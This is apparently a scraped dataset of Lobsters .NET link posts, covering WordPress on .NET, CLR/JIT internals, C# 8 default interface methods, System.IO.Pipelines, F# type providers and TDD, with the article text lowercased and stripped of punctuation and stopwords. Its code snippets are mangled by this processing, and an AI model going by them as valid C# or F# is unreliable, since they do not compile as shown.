250,Lobsters,dotnet,"C#, F#, .NET programming",Wordpress Compiled into a .NET assembly,https://github.com/iolevel/wpdotnet-sdk,wordpress compiled net assembly,wordpress net standard assembly without php add wordpress aspnet core app aspnet core middleware configuration http wpdotnetsaltsazurewebsitesnet configuration method running repo source cmd v vscode wordpress net sdk app peachpiedwordpress peachpiedwordpressstandard peachpiedwordpressaspnetcore possible use case improve performance write plugins c integrate wp net application sourceless distribution take advantage prerequisite marketplace,wordpress net standard assembly without php chat community gitter need help add wordpress aspnet core app use wordpress aspnet core middleware add package reference peachpiedwordpressaspnetcore prerelease add wordpress middleware within configure startup method public class startup public void configure iapplicationbuilder app appusewordpress configuration appsettingsjson wordpress net configured using standard appsettingsjson longer editing wpconfigphp source file wordpress dbhost localhost dbpassword password dbuser root dbname wordpress dbtableprefix wp salt authkey r eombkevlg f authsalt azvj sc j pkutir zr loggedinkey aaienfsridcuzf v rclg mopkwe tsswa loggedinsalt c ddi p g dhwl noncekey z mcha osldh rt nizxkygwu hd vk knb noncesalt pz w g qn secureauthkey pc llsklvqibzm g xv e secureauthsalt n ow mvzf auuxuawf wqq vjt tb constant generate unique set salt feel free use daniel llewellyn tool http wpdotnetsaltsazurewebsitesnet note wordpress expects mysql database running database dbname already created otherwise get error configuration value omitted use default value configuration method service configured using addwordpress configuration method first argument callback providing option object modified public class startup public void configureservices iservicecollection service servicesaddwordpress option optionsdbhost localhost optionsdbname wordpress option object already initialized default value appsettingsjson configuration running repo source start mysql user root password password created database wordpress cmd dotnet run p app v open solution start app project vscode open folder hit wordpress net sdk solution provides wordpress net standard assembly consisting following project app demo project run wordpress part aspnet core application peachpiedwordpress contains source wordpress compiled single net standard assembly peachpiedwordpressdll together content file packed nuget package peachpiedwordpress project contains additional file wpcontentmupluginspeachpieapiphp mustuse plugin exposing wordpress api net wpdummyphp declaring dummy class required used plugins compiled successfully peachpiedwordpressstandard defines abstraction layer providing net interface php wordpress instance interface implemented provided peachpieapiphp peachpiedwordpressaspnetcore aspnet core request handler configures aspnet pipeline pas request compiled wordpress script configuration includes response caching short url mapping various net enhancement setting wordpress database project contains complete source code wordpress additional must use wordpress plugin expose php api net purpose code compiled peachpie resulting output running purely microsoft net core therefore everything work see standard unchanged wordpress way would traditional php version difference compiled website run net core background also approach allows take advantage aspnet core request handling make possible extend wordpress c ie plugins theme etc possible use case improve performance compiled code fast also optimized net jitter actual system additionally net performance profiler may used resolve bottleneck write plugins c plugin functionality implemented separate c project andor php plugins may use net library utilize net advantage like sourceless distribution type safe compiled code optimized checked actual platform integrate wp net application drive wordpress life cycle c app run within kestrel web server sourceless distribution compilation source file needed file contain metadata like plugins theme kept output take advantage net runtime jitted secure manageable platform prerequisite net core newer mysql server optionally visual studio visual studio code using official peachpie vscode extension available marketplace
251,Lobsters,dotnet,"C#, F#, .NET programming",Presentations and Talks covering ‘.NET Internals’,http://www.mattwarren.org/2018/07/12/Presentations-and-Talks-covering-.NET-Internals/,presentation talk covering net internals,presentation talk covering net internals really seemed appreciate criterion internals net runtime worth watching watched overlap another talk awesome talk awesome net performance list talk perfview ultimate net performance tool sasha goldshtein writing high performance code net bart de smet state net performance adam sitnik let talk microbenchmarking andrey akinshin safe system programming c net summary joe duffy flingos using c o ed nutting maoni stephen net gc maoni stephen new performance net core ben adam open source hacking coreclr geoff norton net core cross platform matt elli net core unix jan vorlicek multithreading deep dive gael fraiteur everything need know net memory ben emmett missed please let know comment twitter perfview ultimate net performance tool sasha goldshtein slide modern garbage collection theory practice making net application faster perfview vance morrison performance perfview writing high performance code net bart de smet pluralsight course clrmd state net performance adam sitnik slide let talk microbenchmarking andrey akinshin slide benchmarkdotnet safe system programming c net summary joe duffy slide blog midori project flingos using c o ed nutting slide flingos maoni stephen net gc maoni stephen clr server background gc net practice bing new performance net core ben adam slide open source hacking coreclr geoff norton net core cross platform matt elli net core open source net core unix jan vorlicek slide multithreading deep dive gael fraiteur postsharp everything need know net memory ben emmett slide channel channel many many available one watch blame,presentation talk covering net internals jul word constantly surprised popular resource related net internals instance take tweet thread followed done put together list presentationstalks based criterion people really seemed appreciate criterion keep thing focussed talk presentation must explain aspect internals net runtime clr ie something underthehood lowlevel better eg gc work jit assembly structured inspect going etc entertaining worth watching ie worth someone giving min time hard talking lowlevel detail speaker manage need talk watched actually learnt something ie hope good based speakertopic unique fine overlap another talk often help two people cover idea different perspective want general list talk presentation see awesome talk awesome net performance list talk complete list talk including bonus one tweet perfview ultimate net performance tool sasha goldshtein writing high performance code net bart de smet state net performance adam sitnik let talk microbenchmarking andrey akinshin safe system programming c net summary joe duffy flingos using c o ed nutting maoni stephen net gc maoni stephen new performance net core ben adam open source hacking coreclr geoff norton net core cross platform matt elli net core unix jan vorlicek multithreading deep dive gael fraiteur everything need know net memory ben emmett also added category missed please let know comment twitter perfview ultimate net performance tool sasha goldshtein slide fact watch talkspresentations sasha done great example modern garbage collection theory practice making net application faster talk great howto guide perfview use jit stats memory allocation cpu profiling perfview see interview creator vance morrison performance perfview writing high performance code net bart de smet also pluralsight course subject feature clrmd windbg etw event perfview plus great real world performance issue state net performance adam sitnik slide write highperf code play nicely net gc covering span memory valuetask let talk microbenchmarking andrey akinshin slide primarily look benchmark net code along way demonstrates internal behaviour jit compiler andrey creator benchmarkdotnet safe system programming c net summary joe duffy slide blog joe duffy worked midori project show c good system programming language including lowlevel feature provides flingos using c o ed nutting slide show need want write entire o c flingos project worth checking great learning resource maoni stephen net gc maoni stephen main net gc developer addition clr server background gc net practice bing also worth watch indepth q net gc work use efficiently new performance net core ben adam slide whilst mostly focus performance great internal detail jit generates code devirtualisation exception handling bound checking open source hacking coreclr geoff norton making net core coreclr work osx mostly community contribution talk walkthrough took make happen net core cross platform matt elli one net runtime engineer one made net core open source also worth watch discussion early work done make coreclr crossplatform including build setup platform abstraction layer pal o difference accounted net core unix jan vorlicek net runtime engineer slide talk discus part clr changed run unix including exception handling calling convention runtime suspension pal multithreading deep dive gael fraiteur creator postsharp take really indepth look clr memorymodel threading primitive everything need know net memory ben emmett slide explains net gc work using lego innovative effective approach channel channel video recorded microsoft deserve category much deep technical information list selection including favourite many many available one watch recommend yet watched break rule look really interesting watch soon get chance thought worth including post cause go watch hour hour video ignoring friend family work next week blame
252,Lobsters,dotnet,"C#, F#, .NET programming",Default Interface Methods in C# 8,https://www.infoq.com/articles/default-interface-methods-cs8,default interface method c,key takeaway related sponsored content default interface method example click image enlarge figure call class error message c language design note apr modifier interface click image enlarge figure modifier allowed overridden method diamond problem figure diamond problem dependency click image enlarge figure diamond problem error message default interface method c language design note apr keyword ilogger example player example generic filter example limitation click image enlarge figure compilation error visual studio source code repository developer resource author bassam alugili,key takeaway default interface method included new feature proposal c allow developer use trait programming technique trait objectoriented programming technology promotes reuse method unrelated class c language developer based feature java default method concept c address diamond inheritance problem occur default interface method taking specific override runtime c compiler try protect making many common implementation error utilizing default interface method default interface method also known virtual extension method new feature proposal c allow c developer use trait programming technique trait objectoriented programming technology promotes reuse method unrelated class article explain important thing new feature including new c syntax show example feature make code clean compact main benefit default method bring possible add new default method existing interface without breaking class implement interface word feature make optional implementers override method related sponsored content excellent scenario feature logging example described ilogger interface one abstract writelogcore method method like writeerror writeinformation default method call writelogcore method different configuration ilogger implementer implement writelogcore method think many line code saved inherited class logger type feature great thing danger form multiple inheritance hence suffers diamond problem described also interface method must pure behavior without state mean interface still past directly reference field c syntax interface net compiler extended accept new keywords interface listed example write private method interface code still compile work body method indexer property event accessor private protected internal public virtual abstract override sealed static extern static field static method property indexer event explicit access modifier default access public override modifier allowed instance state instance field instance autoproperties default interface method example consider simple example illustrates feature work default interface method interface idefaultinterfacemethod public void defaultmethod consolewriteline default method interface class anyclass idefaultinterfacemethod class program static void main idefaultinterfacemethod anyclass new anyclass anyclassdefaultmethod console output default method interface look code see interface default method implementer class contains neither knowledge default method implementation interface method change idefaultinterfacemethod anyclass shown anyclass anyclass new anyclass anyclassdefaultmethod code produce compiletime error anyclass contain member defaultmethod proof inherited class know anything default method click image enlarge figure call class error message access default method interface must upcast interface anyclass anyclass new anyclass idefaultinterfacemethod anyclass defaultmethod console output default method interface also worth mentioning feature existed long time java net team considered java default method documentation reference net framework developer example look deeply java must accumulated insight already topic c language design note apr modifier interface mentioned c syntax interface extended accept following keywords protected internal public virtual default default interface method virtual unless sealed private modifier used similarly abstract default interface member without body example virtual abstract interface idefaultinterfacemethod default method virtual virtual keyword used virtual void defaultmethod consolewriteline default method interface default method abstract abstract keyword used abstract void sum interface ioverridedefaultinterfacemethod idefaultinterfacemethod void idefaultinterfacemethoddefaultmethod consolewriteline overridden default method class anyclass idefaultinterfacemethod ioverridedefaultinterfacemethod public void sum class program static void main idefaultinterfacemethod anyclass new anyclass anyclassdefaultmethod ioverridedefaultinterfacemethod anyclassoverridden new anyclass anyclassoverriddendefaultmethod console output default method interface overridden default method keywords virtual abstract removed interface however removing effect compiled code note access modifier permitted overridden method override example interface ioverridedefaultinterfacemethod idefaultinterfacemethod public void idefaultinterfacemethoddefaultmethod consolewriteline overridden default method code produce compiletime error modifier public valid item click image enlarge figure modifier allowed overridden method diamond problem ambiguity arise allowing multiple inheritance big problem language like c allow multiple inheritance state c however multiple inheritance allowed class rather interface limited way contain state figure diamond problem dependency consider following situation diamond inheritance class interface void interface b void systemconsolewriteline interface b interface c void systemconsolewriteline interface c class b c static void main c c new cm code produce compiletime error shown figure click image enlarge figure diamond problem error message net developer team decided solve diamond problem taking specific override runtime diamond class class implementation interface member always win default implementation interface even inherited base class default implementation always fallback class implementation member want know problem find information proposal default interface method c language design note apr back example problem specific override inferred compiler however add method class shown compiler us class implementation solve diamond problem class b c compiler use specific override defined class void systemconsolewriteline class static void main new console output class keyword code example show use keyword interface public interface idefaultinterfacewiththis internal int int x get systemconsolewriteline x return x set systemconsolewriteline setx void calldefaultthis int x x class defaultmethodwiththis idefaultinterfacewiththis using code idefaultinterfacewiththis defaultmethodwiththis new defaultmethodwiththis consolewriteline defaultmethodwiththis defaultmethodwiththiscalldefaultthis console output setx ilogger example logger interface used example explain default method technique code example contains one abstract method named writecore method default implementation consolelogger tracelogger implementing interface look code see code compact clean past mandatory implement method class implement interface unless class abstract class might make code dry new approach class consolelogger able inherit another class hierarchy word using default method give flexible design enum loglevel information warning error interface ilogger void writecore loglevel level string message void writeinformation string message writecore loglevelinformation message void writewarning string message writecore loglevelwarning message void writeerror string message writecore loglevelerror message class consolelogger ilogger public void writecore loglevel level string message consolewriteline level message class tracelogger ilogger public void writecore loglevel level string message switch level case loglevelinformation tracetraceinformation message break case loglevelwarning tracetracewarning message break case loglevelerror tracetraceerror message break using code ilogger consolelogger new consolelogger consoleloggerwritewarning cool code duplication output warning cool code duplication ilogger tracelogger new tracelogger consoleloggerwriteinformation cool code duplication cool code duplication player example game contains different type player power player cause attack damage side limited player cause le damage public interface iplayer int attack int amount public interface ipowerplayer iplayer int iplayerattack int amount return amount public interface ilimitedplayer iplayer int iplayerattack int amount return amount public class weakplayer ilimitedplayer public class strongplayer ipowerplayer using code iplayer powerplayer new strongplayer consolewriteline powerplayerattack output iplayer limitedplayer new wakeplayer consolewriteline limitedplayerattack output see code example default implementation ipowerplayer interface ilimitedplayer interface limited player le damage define new class example superduperplayer inherited class strongplayer new class automatically receives default power attack behavior interface shown example public class superduperplayer strongplayer iplayer superduperplayer new superduperplayer consolewriteline superduperplayerattack output generic filter example applyfilter default interface method contains predicate applied generic type example dummy filter used simulate mocked behavior interface igenericfilter ienumerable applyfilter ienumerable collection func bool predicate foreach var item collection predicate item yield return item interface idummyfilter igenericfilter ienumerable igenericfilter applyfilter ienumerable collection func bool predicate return default public class genericfilterexample igenericfilter int idummyfilter int using code igenericfilter int genericfilter new genericfilterexample var result genericfilterapplyfilter new collection int x x console output idummyfilter int dummyfilter new genericfilterexample var emptyresult dummyfilterapplyfilter new collection int x x console output use generic filter concept many design need limitation limitation consideration first need understand using modifier keywords interface many case compiler protects mistake detecting lot common error listed consider following code interface iabstractinterface abstract void abstract private void abstract static void static extern void class testme iabstractinterface void void void void code produce listed compiletime error error declare body marked abstract error virtual abstract member private error static member marked override virtual abstract error extern declare body error inaccessible due protection level error mean default method abstract time body error mean method private time abstract visual studio click image enlarge figure compilation error visual studio source code repository developer resource information source code author bassam alugili senior software specialist database expert stratec ag stratec worldleading partner fully automated analyzer system software laboratory data management smart consumables
253,Lobsters,dotnet,"C#, F#, .NET programming",.NET JIT and CLR - Joined at the Hip,http://www.mattwarren.org/2018/07/05/.NET-JIT-and-CLR-Joined-at-the-Hip/,net jit clr joined hip,net jit clr joined hip digging net internals joined hip rest post explore interaction component work together need jit compiler fantastic overview botr excellent tutorial hitchhikersguidetothecoreclrsourcecode component within clr note hitchhikersguidetothecoreclrsourcecode classification scheme clr jit compiler transform method il machine code ryujit overview interface jit compiler implement srcinccorjith srcjiteeildllcpp interface ee implement srcinccorinfoh srcvmjitinterfacecpp compilemethod many scenario note gist jit us compilation much gist interface method contain give nice insight information jit request runtime therefore knowledge requires compiling single method ee jit jit ee coreclr glossary superpmi readme superpmi gather capture information passed jit net host net execution engine ee invoked hacker news rdotnet reading,net jit clr joined hip jul word digging net internals never really looked closely justintime jit compiler work mind interaction net runtime jit always looked like nice straightforward clr asks jit compile intermediate language il code machine code jit hand back byte done however turn interaction much complicated reality look like jit clr execution engine ee virtual machine vm work closely one another really joined hip rest post explore interaction component work together need jit compiler quick aside post talking internals jit compiler want find work recommend reading fantastic overview botr excellent tutorial helpful diagram come still want take look jit section hitchhikersguidetothecoreclrsourcecode component within clr go helpful discus common language runtime clr actually composed actually made several different component including vmee jit gc others treemap show different area source code grouped colour toplevel section fall clearly see vm jit dominate well mscorlib component written c hover individual box get detailed information click different radio button toggle sizing locfilescommits note treemap previous post hitchhikersguidetothecoreclrsourcecode written year ago exact number changed meantime also see component area reflected classification scheme used coreclr github issue one difference areacodegen used instead jit clr jit compiler onto main subject clr jit compiler work together transform method il machine code always book runtime good place start execution environment external interface section ryujit overview ryujit provides time compilation service net runtime runtime variously called ee execution engine vm virtual machine simply clr common language runtime depending upon configuration ee jit may reside different executable file ryujit implement jit side jitee interface icorjitcompiler interface jit compiler implement interface defined srcinccorjith implementation srcjiteeildllcpp following key method interface compilemethod main entry point jit ee pass icorjitinfo object info containing il method header various useful tidbit return pointer code size additional gc eh optionally debug info getversionidentifier mechanism jitee interface versioned single guid manually generated jit ee must agree getmaxintrinsicsimdvectorlength communicates ee largest simd vector length jit support icorjitinfo interface ee implement many method defined allow jit look metadata token traverse type signature compute field vtable offset find method entry point construct string literal etc bulk interface inherited icordynamicinfo defined srcinccorinfoh implementation defined srcvmjitinterfacecpp main interface icorjitcompiler implemented jit compiler allows ee control method compiled second icorjitinfo ee implement allow jit request information need compilation let look interface detail firstly examine icorjitcompiler interface exposed jit actually pretty straightforward contains method corjitresult stdcall compilemethod void clearcache bool iscachecleanuprequired void processshutdownwork icorstaticinfo info void getversionidentifier unsigned getmaxintrinsicsimdvectorlength void setrealjit interesting one compilemethod following signature virtual corjitresult stdcall compilemethod icorjitinfo comp struct corinfomethodinfo info unsigned code corjitflag flag byte nativeentry ulong nativesizeofcode ee provides jit information method want compiled corinfomethodinfo well flag corjitflag control level optimisation whether code compiled debug release mode code need profilable support editandcontinue alignment loop ie aligned byteboundaries used many scenario final parameter reference icorjitinfo interface covered next section apis ee implement work jit simple almost function callback note link take function definition given interface alternatively method listed together gist icorjithost make available functionality would normally provided operating system predominantly ability allocate page memory jit us compilation icorjitinfo class icorjitinfo public icordynamicinfo contains specific memory allocation routine including one gc info data methodfunclet unwind information rdata pdata method exception handler block icordynamicinfo class icordynamicinfo public icorstaticinfo provides data change invocation invocation ie jit cache result method call includes function provide thread local storage tl index function entry point address ee helper function address field constructor delegate much finally icorstaticinfo subdivided specific interface interface nicely composed easily see provides bulk function concerned information module class method field instance jit query class size gc layout obtain address field within class also learn method signature find parent class get exception handling information full list method available gist interface method contain give nice insight information jit request runtime therefore knowledge requires compiling single method let look endtoend flow couple method see implemented coreclr source code ee jit getfunctionentrypoint first look method ee provides information jit jit ee reportinliningdecision next look scenario data flow jit back ee finally want cover superpmi tool showed previous scenario tool coreclr glossary superpmi jit component test framework super fast jit testing mocksreplays ee eejit interface nutshell allows jit development testing decoupled ee useful seen component tightly integrated work readme superpmi work two phase collection playback collection phase system configured collect superpmi data run set net managed program managed program invoke jit compiler superpmi gather capture information passed jit net host playback phase superpmi load jit directly cause compile function previously compiled using collected data provide answer various question jit need ask net execution engine ee invoked explains superpmi implementation every method part jit ee interface superpmi need record collect interaction ee store information played back later time ee present discus post hacker news rdotnet reading always read far information might find useful
254,Lobsters,dotnet,"C#, F#, .NET programming","Pipe Dreams, part 1",https://blog.marcgravell.com/2018/07/pipe-dreams-part-1.html,pipe dream part,pipeline guided tour new io api net part part blogged upcoming experimental io api net world part library update pipeline replace complement cassette tape pipeline starting simple writing reading single pipe eofs never key point awaken reactivate mean summary,pipeline guided tour new io api net part part two year ago blogged upcoming experimental io api net world time provisionally called channel end may finally shipped name systemiopipelines hugely interested api last week consumed converting stackexchangeredis use pipeline part library update hope series discus pipeline use term code might want use help put concrete term introducing pipeline intend draw heavily stackexchangeredis conversion particular discussing problem solves u scenario spoiler virtually case answer summarized perfectly fit complex common stumbling point io code allowing u replace ugly kludge workaround compromise code purposedesigned elegant solution framework code pretty sure pain point going cover familiar anyone work data protocol level equally sure hack mess replacing pipeline duplicated lot codebases pipeline replace complement starting point closest analogue existing framework code simple stream stream api familiar anyone worked serialization data protocol aside stream actually ambiguous api work differently different scenario stream readonly writeonly readwrite concrete type sometimes readonly sometimes writeonly deflatestream example stream readwrite sometimes work like cassette tape read write operating underlying data filestream memorystream sometimes work like two separate stream read write essentially completely separate stream networkstream sslstream duplex stream many duplex case hard impossible express data arriving continue read data end close usually kill half duplex sometimes stream seekable support concept like position length often progression apis time often multiple way performing operation example could use read synchronous beginreadendread asynchronous using iasyncresult pattern readasync asynchronous using asyncawait pattern calling code way general case knowing intended optimal api use either asynchronous apis often unclear threading model always actually synchronous thread calling back use synccontext threadpool io completionport thread recently also extension allow span byte memory byte used place byte caller way knowing preferred api nature api encourages copying data need buffer blockcopy another chunk memory need backlog data nt processed yet blockcopy another chunk memory etc even start talking realworld stream example problem happen using clear lot problem stream api first unsurprising news pipeline sort mess pipeline pipeline mean set key apis implement decoupled overlapped readerwriter access binary stream stream including buffer management pooling recycling threading awareness rich backlog control overfill protection via backpressure based around api designed around noncontiguous memory heck word salad nt worry talking element explain mean starting simple writing reading single pipe let start stream analogue write sometthing simple stream read back sticking stream api use ascii text nt need worry complex encoding concern readwrite code nt assume anything underlying stream write data read end stream consume stream first familiar territory reimplement pipeline see similarity difference lie investigate actually happening hood understand interesting u also say yes aware textreadertextwriter using intentionally trying talk stream api example extends wide range data protocol scenario using memorystream m new memorystream write something writesomedata m rewind memorystream work like tape msposition consume readsomedata m write stream caller need obtain populate buffer pas stream keep simple using synchronous api simply allocating byte void writesomedata stream stream byte byte encodingasciigetbytes hello world streamwrite byte byteslength streamflush note ton thing could efficiency nt point yet familiar type code twitching nt panic make uglier er mean efficient later reading code typically complex writing code reading code ca nt assume get everything single call read read operation stream return nothing indicates end data could fill buffer could return single byte despite offered huge buffer read code stream almost always loop void readsomedata stream stream int bytesread note caller usually ca nt know much size length usually usable byte buffer new byte bytesread streamread buffer bufferlength bytesread note work singlebyte encoding string encodingasciigetstring buffer bytesread consolewrite bytesread let translate pipeline pipe broadly comparable memorystream except instead able rewind many time data simply first first queue writer api push data one end reader api pull data pipe buffer sits two let reproduce previous scenario using single pipe instead memorystream something usually practice simple illustrate pipe pipe new pipe write something await writesomedataasync pipewriter signal wo nt anything else written pipewritercomplete consume await readsomedataasync pipereader first create pipe using default option write note io operation pipe usually asynchronous need await two helper method note also nt pas pipe unlike stream pipeline separate api surface read write operation pas pipewriter helper method writing pipereader helper method reading writing data call complete pipewriter nt memorystream automatically eofs reach end buffered data stream implementation especially oneway stream might call close writing data ok writesomedataasync look like note deliberately overannotated async valuetask writesomedataasync pipewriter writer use oversized size guess memory byte workspace writergetmemory write data workspace int byte encodingasciigetbytes hello world workspacespan tell pipe much workspace actually want commit writeradvance byte streamflush await writerflushasync first thing note dealing pipeline nt control buffer pipe recall stream code read write code created local byte nt instead ask pipe buffer workspace via getmemory method twin getspan might expect name give u either memory byte span byte size least twenty byte obtained buffer encode string mean writing directly pipe memory keep track many byte actually used tell advance obligation use twenty asked could write zero one twenty even fifty byte last one may seem surprising actually actively encouraged emphasis previously least writer actually give u much bigger buffer ask dealing larger data common make modest request expect greatness ask minumum usefully utilize check size memoryspan give u deciding much actually write call advance important completes single write operation making data available pipe consumed reader call flushasync equally important much nuanced however adequately describe need take look reader readsomedataasync method async valuetask readsomedataasync pipereader reader true await data available readresult read await readerreadasync readonlysequence byte buffer readbuffer check whether reached end processed everything bufferisempty readiscompleted break exit loop process received foreach memory byte segment buffer string encodingasciigetstring segmentspan consolewrite tell pipe used everything readeradvanceto bufferend like stream example loop continues reached end data stream defined read return nonpositive result pipeline two thing check readiscompleted tell u whether write pipe signalled completed therefore data written pipewritercomplete earlier code bufferisempty tell u whether data left proces iteration nothing pipe writer completed never anything pipe exit data look buffer first let talk buffer code readonlysequence byte new type concept combine role describing noncontiguous memory speficially sequence zero one many readonlymemory byte chunk describing logical position sequenceposition datastream particular via bufferstart bufferend noncontiguous important look data actually going shortly term reading need prepared handle data could spread accross multiple segment case simple foreach buffer decoding segment turn note even though api designed able describe multiple noncontiguous buffer frequently case data received contiguous single buffer case often possible write optimized implementation single buffer checking bufferissinglesegment accessing bufferfirst finally call advanceto tell pipe much data actually used key point nt need take everything given contrast stream call read stream put data buffer gave realworld scenario nt always possible consume data yet maybe make sense consider command entire text line nt yet seen crlf data stream tough given data problem ca nt use yet need store backlog somewhere however pipeline tell consumed case telling consumed everything given passing bufferend advanceto mean never see data like stream however could also passed bufferstart would mean nt use anything even though chance inspect data would remain pipe subsequent read also get arbitrary sequenceposition value inside buffer read byte example full control much data dropped pipe two way getting sequenceposition slice readonlysequence byte way slice span memory access start end resulting subrange use getposition method readonlysequence byte return relative position without actually slicing even subtle tell separetely consumed amount inspected different amount common example express drop much done looked everything ca nt make progress moment need data specifically readeradvanceto consumedtoposition bufferend subtle interplay pipewriterflushasync pipereaderreadasync start come play skipped flushasync earlier actually serf two different function one call readasync call outstanding need data awakens reader allowing read loop continue writer outpacing reader pipe filling data nt cleared reader suspend writer completing synchronously reactivated space pipe threshold writer suspendresume optionally specified creating pipe instance obviously concept nt come play example central idea pipeline work ability push data back pipe hugely simplifies vast range io scenario virtually every piece protocol handling code seen pipeline mass code related handling backlog incomplete data repeated piece logic incredibly happy see handled well framework library instead awaken reactivate mean might observed nt really define meant obvious level mean await operation readasync flushasync previously returned incomplete asynchronous continuation get invoked allowing async method resume execution yeah ok restating asyncawait mean bugbear mine care deeply really alarming deep thread code run reason talk later series saying asynchronous continuation get invoked nt enough want understand invoking term thread common answer delegate via synchronizationcontext note many system synchronizationcontext thread triggered state change get used point state change invoke continuation global threadpool used invoke continuation fine case terrible case synccontext wellestablished mechanism getting worker thread back primary application thread epecially ui thread desktop application however nt necessarily case finished one io operation ready jump back application thread effectively push lot io code data processing code onto application thread usually one thing explicitly want avoid additionally prone deadlock application code used wait result asynchronous call fair meant second option performing callback inline thread triggered problematic steal thread expected something else lead deadlock consequence extreme case lead stackdive eventually stackoverflow two asynchronous method essentially functioning coroutines final option global threadpool immune problem two run severe problem load condition something discus later part series however good news pipeline give control creating pipe instance supply pipescheduler instance use reader writer separately pipescheduler used perform activation specified default first checking synchronizationcontext using global threadpool inline continuation ie intionally using thread caused state change another option readily available provide implementation pipescheduler giving full control threading model summary looked pipe considered individually write pipe pipewriter read pipe pipereader advance reader writer looked similarity difference stream discussed readasync flushasync interact control writer reader piece execute looked responsibility buffer reversed pipe providing buffer pipe simplify backlog management finally discussed threading model active continuation await operation probably enough step next look memory model pipeline work ie data live also look use pipeline real scenario start interesting thing
255,Lobsters,dotnet,"C#, F#, .NET programming",Introducing fuget.org,http://praeclarum.org/post/174440517348/introducing-fugetorg,introducing fugetorg,click redirected,click redirected
256,Lobsters,dotnet,"C#, F#, .NET programming",F# Data Type Providers in .Net Core,https://lukemerrett.com/fsharp-data-type-providers/,f data type provider net core,fsharpdata library beta version package doc found compile time compile time f data library doc,one f killer feature type provider ability make room full developer gasp shown first time support recently added fsharpdata library net standard allowing u use type provider range format net core mind let explore feature type provider way generating static type consistent verifiable compile time whilst still dynamically built demonstrate mean let start json file id firstname bob lastname baggins hobby mountain biking gaming music statically typed language like c java start consuming json building model using systemcollectionsgeneric namespace datatypeproviderscsharpversion public class samplemodel public int id get set public string firstname get set public string lastname get set public list string hobby get set deserialise json predefined model var json filereadalltext jsonfile var content jsonconvertdeserializeobject list samplemodel json foreach var person content consolewriteline loaded personfirstname personlastname advantage building model clear code expect consuming raw json disadvantage however maintain model keeping date json schema change also brittle schema change forget update model application error runtime another disadvantage come working complex model large xml document maintaining class representation schema become cumbersome time consuming could instead dynamically consume json commonly done language like python javascript like open jsonfile f content jsonload f person content print f loaded person firstname person lastname remove need predefine model however model implicit difficult working name type refer loading json also brittle schema still change breaking code let see would f type provider firstly need fsharpdata nuget package time writing net standard support available beta version package going using json type provider library doc found dependency added load json like open fsharpdata open systemio type sample jsonprovider samplejson let content sampleparse filereadalltext jsonfile person content printfn loaded personfirstname personlastname note added explicit model like c version may thinking ok like python version evaluated runtime would however wrong magic happens behind scene type provider compile time reading file provided working key type file example see id key work based occurrence provided file integer dynamically generating type file across key possible type permutation passing type compiler like normal class declared provides u two really interesting advantage firstly get intellisense providing name type json file consuming without actually build model first secondly mean schema samplejson file change code fail compile time build error includes type change multiple type stored property example let update source json id firstname bob lastname baggins hobby mountain biking gaming music id jimbob firstname jim lastname bob hobby id key either integer string reflected generated type usage assumed id integer would break allowing u catch bug compile time rather runtime access value like person content match personidnumber id printfn integer id id none match personidstring id printfn string id id none pure magic found especially useful exploring new data set allowing rapid understanding structure data also franky invaluable dealing overly complex response object looking elasticsearch become onerous map hand find read f data library doc hoping net standard support come prerelease soon
257,Lobsters,dotnet,"C#, F#, .NET programming",How Unit Testing Improves Code Quality in TDD,https://www.simform.com/unit-testing-tdd/,unit testing improves code quality tdd,case study difference noticed defect rate unit testing started working tdd according bhat nagappan case study microsoft showed development time using tdd grew experience development time defect rate development time impact cost development noticed cost reduction implementing tdd organization case tdd result good test coverage lasting regression test suite experience increase test coverage yes much case study difference noticed defect rate unit testing started working tdd according bhat nagappan case study microsoft showed development time using tdd grew experience development time quality code defect rate development time impact cost development noticed cost reduction implementing tdd organization case tdd result good test coverage lasting regression test suite experience increase test coverage yes much case study difference noticed defect rate unit testing started working tdd according bhat nagappan case study microsoft showed development time using tdd grew experience development time defect rate development time impact cost development noticed cost reduction implementing tdd organization case tdd result good test coverage lasting regression test suite experience increase test coverage yes much conclusion,seen lot benefit unit testing tdd important know experience individualscompanies perform unit testing tdd asked question people working tddcase study difference noticed defect rate unit testing started working tdd started practicing tdd personal defect rate decreased clearly high defect rate time importantly though noticed practiced testfirst programming even without emphasis refactoring produced different kind defect done would still produce occasional silly mistake would still produce complicated difficulttodiagnose defect unexpected behavior emerging integrating larger part system nontrivialbuteasytounderstand defect disappeared find mistake myselfi think term cost mistake instead frequency mistake practicing tdd help reduce cost mistake reducing time make mistake notice mistake herein lie lot costsaving testfirst programming sooner see mistake easily fix itaccording bhat nagappan case study microsoft showed development time using tdd grew experience development time know case study well know whether compare apple apple worked ibm worked common enterprise environment code freeze code freeze programmer built new feature code freeze programmer fixed urgent managerapproved defect started practicing tdd delivered probably le value code freeze code freeze earned trust manager deliver feature right date release quantify additional value trust found intuitively valuable long term squeezing code short termmoreover given evolutionary design aspect tdd noticed greater longerterm benefit since could build version top code version need throw everything away every year saving certainly compensates going even slower short termboth defect rate development time impact cost development noticed cost reduction implementing tdd organization mostly noticed increased cost certainty meaning large decrease unexpectedunplanned cost although stay ibm long enough witness know cost uncertainty decrease cost also gradually decreasesin case tdd result good test coverage lasting regression test suite experience increase test coverage yes much difference night day practice tdd get coverage matter like natural part process writing codecase study difference noticed defect rate unit testing started working tdd relate couple story worked insurance company deployed moderatelysized sloc testdriven java app production first month uncovered production defect total dramatically le typical production applicationi worked clojure programmer using tdd code logic defect time integrationrelated defect defect related misunderstanding customer interestsin work customer code testdrive exhibit logic defect intended behaviortdd remove defect among class defect still integrationrelated defect defect related misunderstanding requirement missed requirement defect unexpected interaction even begin reduce number tdd employedaccording bhat nagappan case study microsoft showed development time using tdd grew experience development time believe study indicate tdd creates increase initial development time comparison project figure far know include cost rework due defect cost associated defect consider increased cost longterm development code quality code absence continual refactoring decreasesi take little stock one study study show similar result however suggests costsvalues attributed tdd reasonably line realityfrom personal stance firmly believe tdd allowed increase development speed time codebase given project grows size related anecdote practicing tdd effort increased even short amount timeduring clojure development year created significant amount code short time using tdd believe would gone faster abandoning tdd particularly given dynamic nature changing requirementsboth defect rate development time impact cost development noticed cost reduction implementing tdd organization thing like always hard quantify clojure codebase logic defect indeed meant reduced cost area rework defect management support also believe reduced cost term time required understand current code behaviorin case tdd result good test coverage lasting regression test suite experience increase test coverage yes much since tdd clojure code coverage percent least system worked likely high range definition never measured relevant number everyone practicing tdd correctly need track coverage past testdriven system later come back measure code coverage curiosity case number always high range certain area view code real low coverage point removing logic itcase study difference noticed defect rate unit testing started working tdd using tdd lot thing caught later qa thrown back developer started babbel right away tdd improvement measured old company adopted tdd issue reported qa decreased considerably used average issue popping qa went also used freecrash rate increased according bhat nagappan case study microsoft showed development time using tdd grew experience development time development time increased sure lose developing 